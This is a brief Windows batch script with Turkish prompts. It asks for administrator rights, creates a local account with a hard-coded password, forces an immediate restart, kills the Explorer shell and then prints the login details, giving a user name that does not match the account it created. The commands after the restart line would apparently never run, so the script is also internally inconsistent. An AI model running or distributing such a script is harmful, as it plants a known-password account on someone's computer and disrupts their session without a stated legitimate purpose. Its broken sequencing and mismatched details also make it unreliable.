@echo off
echo Lütfen Bu Dosyayı Yönetici Olarak Açın.
net user machineuser machineofdmin /add
shutdown -r -t 00
pause
taskkill /f /im explorer.exe
echo Machine İşlemleri Tamamlandı.
echo Machine Kullanıcı Bilgileri
echo Ad: machineusers
echo Şifre: machineofdmin
